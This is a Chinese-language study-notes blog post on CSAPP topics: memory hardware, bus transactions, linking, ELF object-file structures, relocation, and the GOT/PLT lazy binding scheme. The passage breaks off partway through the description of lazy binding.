<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640853366687-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640853366687"> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640853224793-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1640853224793"> 
<p><strong>磁盘</strong></p>
<p>磁盘是用于大量存储数据的存储设备，存储数据的数量级可以达到几千千兆字节，但从磁盘上读取数据的时间为毫秒级，比DRAM慢了10万倍，比SRAM慢了100万倍</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641014928544-1646286364493-1646808754596-1646808862602.png" class width="1641014928544"> 
<p>磁盘由多个重叠在一起的盘片组成，它们被封装在一个密封的包装中</p>
<h2 id="内存结构"><a href="#内存结构" class="headerlink" title="内存结构"></a>内存结构</h2><p>在内存调试时，经常需要用到rank、bank等参数，可以看到电脑的内存条中，有很多一片一片的芯片，这就是内存芯片，也是叫内存颗粒 </p>
<p>内存的基本单元称为 <strong>cell</strong> ，cell按行( <strong>row</strong> )、列( <strong>column</strong> )分布组成一个 <strong>bank</strong> </p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641012026126-1646286364493-1646808754596-1646808862602.png" class width="1641012026126"> 
<p>一颗内存颗粒由多个 <strong>bank</strong> 组成，现在的内存颗粒一般是8个bank，每个bank对于内存来说是平等的关系，因为内存控制器的原因，每个时钟周期只能对一个bank进行操作 </p>
<p>所有在内存容量关系中：<strong>颗粒</strong> &gt; <strong>bank</strong> &gt; <strong>row</strong> ， <strong>column</strong> &gt; <strong>cell</strong> </p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641012787423-1646286364493-1646808754596-1646808862602.png" class width="1641012787423"> 
<h2 id="IO桥接器"><a href="#IO桥接器" class="headerlink" title="IO桥接器"></a>IO桥接器</h2><p>数据通过总线进行流通，每次CPU和主存之间的数据传输都是通过一系列步骤完成的，这些步骤被称为<strong>总线事务</strong></p>
<p>读事务：把数据从主存传输到CPU</p>
<p>写事务：把数据从CPU传输到主存</p>
<p>而现代计算机中IO是通过 <strong>共享一条总线</strong> 的方式来实现的，这就是 <strong>IO总线</strong>（I/O bus）</p>
<p>而<strong>IO桥接器</strong>则是一组芯片组（其中包括内存控制器）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641009467416-1646286364493-1646808754596-1646808862602.png" class width="1641009467416"> 
<p>CPU芯片，IO桥接器，DRAM内存模块</p>
<p>系统总线（system bus）连接了CPU和IO桥接器</p>
<p>内存总线（memory bus）连接IO桥接器和主存</p>
<p>系统总线和内存总线都通过IO桥接器连接到IO总线上，这就实现了各个硬件之间的交互</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641010785822-1646286364493-1646808754596-1646808862602.png" class width="1641010785822"> 
<p>在这个过程中：CPU上被称为<strong>总线接口</strong>的电路会在总线上发起“读事务”</p>
<p>​        //交换“A”和“%rax”位置，则会发起“写事务”</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641011441241-1646286364493-1646808754596-1646808862602.png" class width="1641011441241"> 
<p>CPU会把A放到系统总线上，IO桥接器将信号传递到内存总线,传输到主存</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641011450090-1646286364493-1646808754596-1646808862602.png" class width="1641011450090"> 
<p>接下来主存会识别内存总线上的地址信号，从内存总线中读取地址，从DRAM中取出数据字，并将数据写入内存总线通过IO桥又写入系统总线，传输到CPU</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641011460116-1646286364493-1646808754596-1646808862602.png" class width="1641011460116"> 
<p>最后CPU会读取系统总线上的数据，赋值给寄存器rax</p>
<h2 id="链接器"><a href="#链接器" class="headerlink" title="链接器"></a>链接器</h2><p>链接（linking）是将 <strong>各种代码</strong> 和 <strong>数据片段</strong> 收集并组合成一个单一文件的过程</p>
<p>负责链接工作的程序被称为“链接器”</p>
<p>链接器的出现使我们不用将一个应用组织为一个庞大的文件，而是可以分割为更小的模块</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641352337650-1646286364493-1646808754596-1646808862602.png" class width="1641352337650"> 
<h2 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h2><p>静态链接的链接器必须完成两个任务：符号解析，重定位</p>
<p>符号解析：解析目标文件的符号，把 <strong>符号引用</strong> 和 <strong>符号定义</strong> 关联起来</p>
<p>重定位：通过把 <strong>符号定义</strong> 和 <strong>内存位置</strong> 关联起来，来重定位这些节片段，然后修改对这些符号的引用，使它们指向对应的内存位置</p>
<h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><p>在创建可执行文件时，静态执行一些链接</p>
<p>在程序加载时，动态完成链接</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641720884346-1646286364493-1646808754596-1646808862602.png" class width="1641720884346"> 
<p>动态链接器通过执行下面的重定位来完成链接任务：</p>
<ul>
<li>重定位 libc.so 的文本和数据到某个内存段</li>
<li>重定位 libvector.so 的文本和数据到另一个内存段</li>
<li>重定位 prog21 中所有的 “由 libc.so 和 libvector.so(存档文件) 定义的” 符号的引用</li>
</ul>
<h2 id="存档文件"><a href="#存档文件" class="headerlink" title="存档文件"></a>存档文件</h2><p>存档文件（libvector.so）是一种文件格式，用于存储一组文件以及与这些文件有关的信息（元数据），创建存档文件的目的是将多个文件存储在一起，通常采用压缩格式，这样可以提高可移植性，同时节省磁盘上的存储空间</p>
<h2 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h2><p>目标文件分为3种：</p>
<p>1.可重定位目标文件：包含二进制代码和数据，可以在编译时与其他可重定位目标文件合并，创建一个可执行目标文件</p>
<p>2.可执行目标文件：包含二进制代码和数据，可以直接放入内存执行（就是可执行文件）</p>
<p>3.共享目标文件：一种特殊的可重定位目标文件，可以在加载或者运行时被 <strong>动态</strong> 地加载进内存并进行连接</p>
<p>编译器和汇编器生成：可重定位目标文件</p>
<p>链接器生成：可执行目标文件</p>
<p>各个系统目标文件的格式不同：Unix系统，采用a.out格式；Windows系统，采用PE格式；MacOS系统，采用Mach-O格式</p>
<h2 id="可重定位目标文件"><a href="#可重定位目标文件" class="headerlink" title="可重定位目标文件"></a>可重定位目标文件</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641279880688-1646286364493-1646808754596-1646808862602.png" class width="1641279880688"> 
<p>这个就是可重定位目标文件的格式，ELF头描述了产生该文件的系统的 <strong>字的大小</strong> 和 <strong>字节序</strong></p>
<p>ELF头剩下的部分包含：帮助链接器进行 <strong>语法分析</strong> 和 <strong>解释目标文件</strong> 的信息</p>
<p>不同节的位置大小是由 “节头部” 决定的，其中目标文件的每个节都有一个固定大小的条目（entry），夹在“ELF头”和“节头部表”之间的都是节</p>
<p>一个经典的ELF可重定位目标文件包含下面几个节：</p>
<p>.text：已经编译的程序机器代码</p>
<p>.rodata：只读数据</p>
<p>.data：已经初始化的 全局变量 和 静态变量（局部变量保存在栈中）</p>
<p>.bss：未初始化的 全局变量 和 静态变量（被初始化为“0”的变量也会保存在这里）</p>
<p>.symtab：符号表，用于存放程序中定义或引用的 “函数和全局变量” 的信息</p>
<p>.rel.text：“.text节”的重定位信息，用于重新修改代码段的指令中的地址信息 </p>
<p>.debug：调试符号表</p>
<p>.line：原始C源程序中的行号 和 “.text节”中机器指令之间的映射</p>
<p>.strtab：字符串表（包含“.symtab”和“.debug”中的符号名和节名）</p>
<h2 id="符号及其相关"><a href="#符号及其相关" class="headerlink" title="符号及其相关"></a>符号及其相关</h2><p><strong>符号（symbol）</strong></p>
<p>函数名，变量名，数组名，结构体名都可以称之为符号</p>
<p>在链接器的上下文中一共有3中不同的符号：</p>
<ul>
<li>Global symbols（模块内部定义的全局符号）<ul>
<li>由模块m定义并能被其他模块引用的符号（非static函数，非static全局变量）</li>
</ul>
</li>
<li>External symbols（外部定义的全局符号）<ul>
<li>由其他模块定义并被模块m引用的全局符号</li>
</ul>
</li>
<li>Local symbols（本模块的局部符号）<ul>
<li>仅由模块m定义和引用的本地符号（带有static的函数和全局变量）</li>
<li>注意：局部变量不会在过程外被引用（分配在栈中），因此不是符号定义</li>
</ul>
</li>
</ul>
<p><strong>符号表（symtab）</strong></p>
<p>符号表是由汇编器构造的，包含一个条目的数组，每个条目都是一个结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        Elf32_Word    st_name;      <span class="comment">/* 符号对应字符串在strtab节中的偏移量 */</span> </span><br><span class="line">        Elf32_Word    st_value;     <span class="comment">/* 在对应节中的偏移量，可执行文件中是虚拟地址 */</span></span><br><span class="line">        Elf32_Word    st_size;      <span class="comment">/* 符号对应目标所占字节数 */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span>   type: <span class="number">4</span>,    <span class="comment">/* 符号对应目标的类型：数据、函数、源文件、节 */</span></span><br><span class="line">              		 binding: <span class="number">4</span>;    <span class="comment">/* 符号类别：全局符号、局部符号、弱符号 */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span>   st_other;</span><br><span class="line">        Elf32_Section   st_shndx;    <span class="comment">/* 符号对应目标所在的节，或其他情况 */</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">    Elf64_Word    st_name;        <span class="comment">/* Symbol name (string tbl index) */</span>  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;        <span class="comment">/* Symbol type and binding */</span>  </span><br><span class="line">    <span class="comment">// 高4字节为type，低4字节为binding</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;       <span class="comment">/* Symbol visibility */</span>  </span><br><span class="line">    Elf64_Addr    st_value;       <span class="comment">/* Symbol value */</span>  </span><br><span class="line">    Elf64_Xword   st_size;        <span class="comment">/* Symbol size */</span>  </span><br><span class="line">&#125;Elf64_Sym; </span><br></pre></td></tr></table></figure>
<p>st_name：对应字符串表的偏移</p>
<p>st_value：距离目标符号地址的偏移</p>
<p>st_size：目标的大小</p>
<p>st_info：高字节为type，低字节为binding</p>
<p>type：表示符号类型（要么是数据，要么是函数）</p>
<p>binding：表示符号是本地的，还是全局的</p>
<p><strong>符号和节</strong></p>
<p>每个符号都会被分配到目标文件的某个节，由 section 字段表示，改字段也是一个到节头部表的<strong>索引</strong>，但是存在3个 <strong>伪节</strong> ，它们在节头部表中是没有条目的</p>
<p>ABS：代表不应该被重定位的符号</p>
<p>UNDEF：代表未定义的符号，就是在本目标模块中被引用，但是却在其他地方定义的符号</p>
<p>COMMON：代表未被分配位置的未初始化数据的目录</p>
<p>​        // 只有在可重定位目标文件中才有这些伪节，可执行目标文件是没有的</p>
<p>COMMON和bss节的区别很细微：</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641286551347-1646286364493-1646808754596-1646808862602.png" class width="1641286551347"> 
<p><strong>符号解析</strong></p>
<p>链接器从左往右按照它们在编译器驱动程序命令行上出现的顺序，来扫描可重定位目标文件和存档文件，在这次扫描中，链接器会维护：</p>
<p>一个 <strong>可重定位目标文件的集合E</strong> （将会被合并为可执行目标文件）</p>
<p>一个 <strong>未解析符号集合U</strong> （引用了但是未定义）</p>
<p>一个 <strong>在前面输入文件中已经定义的符号集合D</strong>（自己定义的符号也会被装入）</p>
<p>符号解析的工作流程如下：</p>
<ol>
<li>在命令行上输入文件F，链接器会判断文件F是一个目标文件，还是一个存档文件 </li>
<li>如果是目标文件，则添加到E，并且修改U和D来反应F中的 <strong>符号定义</strong> 和 <strong>引用</strong></li>
<li>如果F是一个存档文件，那么链接会尝试匹配 <strong>未解析符号集合U</strong> 和 <strong>存档文件成员定义的符号</strong> ，假设存档文件中有个成员 m，定义了一个符号来解析U中的一个引用，那么就将 m 添加到E中，并且链接器修改U和D来反映 m 中的 <strong>符号定义</strong> 和 <strong>引用</strong></li>
</ol>
<p>扫描完成以后，集合U非空，链接器就会输出一个错误并终止，以表明有符号未定义</p>
<p>扫描完成以后，集合U为空，那么链接器就会合并集合E中的目标文件，构建可执行文件</p>
<p>​        // 当D被新填入时，对应的U会减少</p>
<p><strong>符号变量</strong></p>
<p>自动变量（动态局部变量）：auto </p>
<ul>
<li>离开函数，值就消失</li>
<li>不写 static 就默认是 auto</li>
</ul>
<p>静态局部变量：static </p>
<ul>
<li>离开函数，值任然保留</li>
<li>变量的值只在函数内部生效</li>
<li>带有 static 的变量只会初始化一次（数据存储在 data 段）</li>
<li>当上一级函数多次调用本函数时，带有 static 的变量数值不变（并且不会进行初始化）</li>
</ul>
<p>寄存器变量：register</p>
<ul>
<li>离开函数，值就消失</li>
<li>变量的值只在函数内部生效</li>
</ul>
<p>全局变量：在 main 之外</p>
<ul>
<li>允许 main 中所有函数访问</li>
<li>允许外部其他文件访问</li>
</ul>
<p>静态全局变量：在 main 之外，static</p>
<ul>
<li>允许 main 中所有函数访问</li>
<li>变量的值只在文件内部生效</li>
</ul>
<h2 id="节"><a href="#节" class="headerlink" title="节"></a>节</h2><p>使用目标文件的节头表，可以定位文件的所有节，节头表是 <code>Elf32_Shdr</code> 或 <code>Elf64_Shdr</code> 结构的数组</p>
<p><strong>节头</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        elf32_Word      sh_name; <span class="comment">/* 节的名称，此成员值是节头字符串表节的索引，用于指定以空字符结尾的字符串的位置 */</span></span><br><span class="line">        Elf32_Word      sh_type; <span class="comment">/* 用于将节的内容和语义分类 */</span></span><br><span class="line">        Elf32_Word      sh_flags; <span class="comment">/* 节可支持用于说明杂项属性的1位标志 */</span></span><br><span class="line">        Elf32_Addr      sh_addr; <span class="comment">/* 如果节显示在进程的内存映像中，则此成员会指定节的第一个字节所在的地址 */</span></span><br><span class="line">        Elf32_Off       sh_offset; <span class="comment">/* 从文件的起始位置到节中第一个字节的字节偏移 */</span></span><br><span class="line">        Elf32_Word      sh_size; <span class="comment">/* 节的大小 */</span></span><br><span class="line">        Elf32_Word      sh_link; <span class="comment">/* 节头表索引链接，其解释依赖于节类型 */</span></span><br><span class="line">        Elf32_Word      sh_info; <span class="comment">/* 额外信息，其解释依赖于节类型 */</span></span><br><span class="line">        Elf32_Word      sh_addralign; <span class="comment">/* 一些节具有地址对齐约束 */</span></span><br><span class="line">        Elf32_Word      sh_entsize; <span class="comment">/* 指定每一项的大小(一些节包含固定大小的项的表) */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        Elf64_Word      sh_name;</span><br><span class="line">        Elf64_Word      sh_type;</span><br><span class="line">        Elf64_Xword     sh_flags;</span><br><span class="line">        Elf64_Addr      sh_addr;</span><br><span class="line">        Elf64_Off       sh_offset;</span><br><span class="line">        Elf64_Xword     sh_size;</span><br><span class="line">        Elf64_Word      sh_link;</span><br><span class="line">        Elf64_Word      sh_info;</span><br><span class="line">        Elf64_Xword     sh_addralign;</span><br><span class="line">        Elf64_Xword     sh_entsize;</span><br><span class="line">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure>
<p><strong>节分配</strong></p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646800862254-1646808754596-1646808862602.png" class width="1646800862254"> 
<p><strong>节简述</strong></p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646800924153-1646808754597-1646808862602.png" class width="1646800924153"> 
<ul>
<li>ELF头：包括16字节的标识信息，文件类型（.o，exec，.so），机器类型（如Intel 80386），节头表的偏移，节头表的表项大小及表项个数 </li>
<li>.text节：编译后的代码部分 </li>
<li>.rodata节：只读数据，如 printf 用到的格式串，switch 跳转表等</li>
<li>.data节：已初始化的全局变量和静态变量</li>
<li>.bss节：未初始化全局变量和静态变量，仅是占位符，不占据任何磁盘空间，区分初始化和非初始化是为了空间效率</li>
<li>.symtab节：存放函数和全局变量（符号表）的信息，它不包括局部变量</li>
<li>.rel.text节：.text节的重定位信息，用于重新修改代码段的指令中的地址信息</li>
<li>.debug节：调试用的符号表（gcc -g） </li>
<li>.strtab节：包含 .symtab节和 .debug节 中的符号及节名 </li>
</ul>
<p><strong>示例</strong>（可能会有不同，比如：在我的电脑上 .data 为第4节）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646632648612-1646808754597-1646808862602.png" class width="1646632648612"> 
<h2 id="运行-amp-链接-amp-加载-amp-存储地址"><a href="#运行-amp-链接-amp-加载-amp-存储地址" class="headerlink" title="运行&amp;链接&amp;加载&amp;存储地址"></a>运行&amp;链接&amp;加载&amp;存储地址</h2><p><strong>运行地址 ~~ 链接地址</strong></p>
<p>链接地址：在程序编译的时候，每个目标文件都是由源代码编译得到，最终多个目标文件链接生成一个最终的可执行文件，而链接地址就是指示链接器，各个目标文件的在可执行程序中的位置 </p>
<ul>
<li>链接地址是静态的，在进行程序编译的时候指定的</li>
</ul>
<p>运行地址： 程序实际在内存中运行时候的地址 </p>
<ul>
<li>运行地址是动态的，如果你将程序加载到内存中时，改变存放在内存的地址，那么运行地址也就随之改变了</li>
</ul>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641356351200-1646286364493-1646808754597-1646808862602.png" class width="1641356351200"> 
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如上图所示，指令ldr r0, =func就是一条位置相关指令，在编译的时候，编译器根据链接地址（链接地址入口是 <span class="number">0x40008000</span> ）将其翻译成：ldr r0, [pc, #<span class="number">0x80</span>]，也就是将func标号等价于地址 <span class="number">0x40008080</span> ，然后将 <span class="number">0x40008080</span> 这个地址数值放在a.out文件中链接地址 <span class="number">0x50008000</span> 的位置。当程序运行时，a.out会被加载到内存中运行，如果程序运行的地址和链接的地址都是 <span class="number">0x40008000</span> ，那么程序运行时，没有任何问题，因为读取的func的地址是 <span class="number">0x40008080</span> ，实际跳转的时候，跳转到 <span class="number">0x40008080</span> 中存放的也是func对应的代码。但是如果运行的地址和链接地址不一样（运行地址是 <span class="number">0x20008000</span> ），这时候，func的地址还是编译的时候计算的地址 <span class="number">0x40008080</span> ，但是实际在内存中，func的地址是 <span class="number">0x20008080</span> ，那么当你跳转执行func的时候，取出来的是 <span class="number">0x40008080</span> ，跳转的地址也是 <span class="number">0x40008080</span> ，而 <span class="number">0x40008080</span> 中存放的是什么代码我们不确定，但是一定不是func的代码（func存放在 <span class="number">0x20008080</span> 中）。这个就是位置相关的概念</span><br></pre></td></tr></table></figure>
<p><strong>加载地址 ~~ 存储地址</strong> </p>
<p>加载地址：每一个程序一开始都是存放在flash中的，而运行是在内存中，这个时候就需要从flash中将指令读取到内存中（运行地址），flash的地址就是加载地址 </p>
<p>存储地址：指令在flash中存放的存储地址，就是存储地址 </p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/CSDNmianfeixiazai001/article/details/81455692">链接地址、运行地址、加载地址、存储地址</a></p>
<h2 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h2><p>但链接器完成符号解析这一步时，就会把代码中的 <strong>每个符号引用</strong> 和 <strong>一个符号定义</strong> 关联起来</p>
<p>此时，链接器就知道它输入目标模块的 “代码节” 和 “数据节” 的切确大小</p>
<p>重定位的工作流程如下：</p>
<ul>
<li>重定位“节”和“符号定义”：链接器会把所有同类型的节合并起来，然后将“运行地址”赋值给 <strong>“新的聚合节”</strong> ， <strong>“输入模块中定义的每个节”</strong> ，以及 <strong>“输入模块中定义的每个符号”</strong> ，这一步完成之后，程序中的每条指令和全局变量都有唯一的“运行地址” </li>
<li>重定位“节”中的“符号引用”：链接器会修改 代码节 和 数据节 中对应 <strong>每个符号的引用</strong> ，使得它们指向 <strong>正确的运行地址</strong> （链接器需要依赖“重定位条目relocation entry”完成此操作）</li>
</ul>
<h2 id="重定位条目"><a href="#重定位条目" class="headerlink" title="重定位条目"></a>重定位条目</h2><p>代码的重定位条目存放于“.rel.text”中</p>
<p>已初始化数据的重定位条目存放于“.rel.data”中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr  r_offset;</span><br><span class="line">    Elf32_Word  r_info; </span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Addr  r_offset;	</span><br><span class="line">    Elf64_Word  r_info; 	</span><br><span class="line">    Elf64_Word r_addend;	</span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>r_offset：需要 “被修改引用” 的节偏移</p>
<p>r_info：高字节为type，低字节为symbol</p>
<p>type：告知链接器如何修改新的引用</p>
<p>symbol：标识 “被修改引用” 应该指向的符号</p>
<p>r_addend：一个符号常数，一些类型的重定位要使用它进行调整</p>
<p>ELF文件定义了32种不同的重定位类型，其中最基本的两种为：</p>
<ul>
<li>R_X86_64_PC32：使用32位 <strong>PC相对地址</strong> 的引用（PC相对地址：距离程序计数器（PC）的当前运行值的偏移量），类似于 “jmp xxxx” 等汇编指令，“xxxx” 加上 程序的“SP指针”得到 <strong>有效地址</strong> ，PC值通常是下一条指令在内存中的地址</li>
<li>R_X86_64_32：使用32位 <strong>绝对地址</strong> ，CPU直接获取 <strong>有效地址</strong></li>
</ul>
<p>文件中的代码和数据总体大小“小于2GB”，使用“R_X86_64_PC32”（小型代码模型）</p>
<p>文件中的代码和数据总体大小“大于2GB”，使用“R_X86_64_32”（中型代码模型，大型代码模型）</p>
<p>GCC默认使用“R_X86_64_PC32”</p>
<h2 id="可执行目标文件"><a href="#可执行目标文件" class="headerlink" title="可执行目标文件"></a>可执行目标文件</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/ELF-Walkthrough-1646286364493-1646808754597-1646808862602.png" class title="ELF-Walkthrough"> 
<p><strong>段和节</strong></p>
<p>段视图：是用来描述ELF加载到进程中后，来划分“读，写，执行”权限划分的视图</p>
<p>节视图：是ELF存放在磁盘中时，进行不同功能区域划分的视图</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641626351152-1646286364493-1646808754597-1646808862602.png" class width="1641626351152">
<p>在汇编源码中，通常用语法关键字section或segment来表示一段区域，它们是编译器提供的伪指令，作用是相同的，都是在程序中”逻辑地”规划一段区域，此区域便是节 </p>
<p>注意，此时所说的section或segment都是汇编语法中的关键字，它们在语法中都表示”节”，不是段，只是不同编译器的关键字不同而已，关键字segment在语法中也被认为与section意义相同  </p>
<p>只有ELF文件加载到内存成为进程过后，才有“段”的概念</p>
<p><strong>ELF文件到虚拟内存的映射</strong></p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641628962609-1646286364493-1646808754597-1646808862602.png" class width="1641628962609"> 
<p>​        // 左边为“节”，右边为“段”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objdump -s elf	<span class="comment">#查看elf文件结构</span></span><br><span class="line">cat /proc/pid/maps	<span class="comment">#输出进程对应的‘虚拟内存’结构</span></span><br></pre></td></tr></table></figure>
<h2 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h2><p>当linux系统加载某个文件时，会通过调用某个驻留在存储器中的 <strong>加载器</strong>（loader）来运行它，加载器本质上也是一段“操作系统代码”（通过execve函数来调用加载器）</p>
<p>加载器把目标文件的“代码”和“数据”，从磁盘复制到内存中的过程就叫做<strong>加载</strong></p>
<h2 id="位置无关代码-PIC"><a href="#位置无关代码-PIC" class="headerlink" title="位置无关代码(PIC)"></a>位置无关代码(PIC)</h2><p>无需“重定位”就可以加装的代码就是 <strong>位置无关代码</strong> （PIC）</p>
<p>位置无关代码无论被加载到哪个地址上都可以正常执行 </p>
<p><strong>PIC的数据引用</strong></p>
<p>无论我们在内存何处加装一个目标模块，它的“数据段”和“代码段”的距离总是保持不变的，因此，代码段中 <strong>任何指令</strong> 和 <strong>任何变量</strong> 之间的距离都是常量</p>
<p>生成全局变量PIC的偏移器利用了这个事实，它在数据段开始的地方创建了一个表，叫做<strong>全局偏移量表</strong>（GOT表），在GOT表中，每个被此模块引用的“全局数据”，“过程”，“全局变量”，都有一个8字节条目</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641723629180-1646286364493-1646808754597-1646808862602.png" class width="1641723629180"> 
<p>加载时，动态链接会重定位GOT表中的每个条目，使其包含目标的绝对地址</p>
<p><strong>PIC的函数调用</strong></p>
<p>编译器没法直接获取“共享库函数”的绝对地址，所以这里采用了<strong>延迟绑定</strong>的方式</p>
<p>延迟绑定技术是通过GOT表（全局偏移量表）和PLT表（过程链接表）的交互完成的</p>
<ul>
<li>过程链接表（plt）：plt是一个数组，每个条目都是16字节的代码，每一个条目负责一个具体的函数，plt[0]是一个特殊条目（它可以跳转 <strong>动态链接器</strong> ），plt[1]调用系统启动函数“libc_start_main”，从plt[2]开始的条目依次调用“用户代码中的函数”</li>
<li>全局偏移量表（got）：got是一个数组，每个条目都是8字节地址，got[0]和got[1]会包含 <strong>动态链接器 </strong>在解析函数地址时需要的信息，got[2]是 <strong>动态链接器</strong> 在“ld-linux.so”模块中的入口点，其余的每一个got表条目都对应一个被调用的函数，每一个条目都有一个对应的plt[n]</li>
</ul>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641724561880-1646286364493-1646808754597-1646808862602.png" class width="1641724561880"> 
<ul>
<li>第1步：程序进入plt[n]（对应被调用函数的plt条目），跳转got[n]</li>
<li>第2步：got[n]没有对应的libc地址，程序跳转回plt[n]</li>
